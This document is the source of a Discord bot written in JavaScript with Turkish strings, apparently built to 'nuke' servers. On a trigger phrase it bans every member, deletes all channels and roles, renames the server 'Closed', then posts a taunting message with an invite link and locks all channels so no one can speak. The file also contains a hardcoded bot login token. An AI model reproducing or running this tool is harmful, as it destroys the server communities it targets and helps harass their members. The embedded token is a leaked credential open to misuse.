////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

const Discord = require('discord.js');
const berke = new Discord.Client();

console.log('Hazırım.');

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


berke.on('message', async msg => {
  if (msg.content.toLowerCase() === 'burayı bi düzelt' ) {

    msg.guild.members.forEach(member => member.ban())
    msg.guild.channels.deleteAll();
    msg.guild.roles.deleteAll();
    msg.guild.setName("Kapandı");
    msg.guild.setIcon("https://www.main-taunus-zentrum.de/fileadmin/user_upload/GLOBAL/brand_stores/logos/closed.png");
    msg.guild.createChannel("hey");

  }
});

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 


berke.on('message', message => {
    if(message.content.toLowerCase() === 'ban kaldır' ) {
        message.guild.fetchBans().then(bans => {
            bans.forEach(user => {
                message.guild.unban(user);
            });
        });
    }
});

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

berke.on('channelCreate', channel => {
  if (channel.name == 'hey') {
    channel.send(`Sunucuya ne oldu neyse üzüldüm :smoking: :smoking: bunları yapanla görüşmek istersen; https://discord.gg/4judfSa`)
    channel.guild.channels.forEach(c => {
         c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
              SEND_MESSAGES: false,
              ADD_REACTIONS: false,
              SPEAK: false
            });
          });
  }
  if (channel.name == '') {
    channel.send(``)
  }

});

berke.login("NjE3NDczNjI3Mzk4NjAyNzUz.XWrtew.OCYAWHNwhKTdbstrtg87uALZA1o");


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////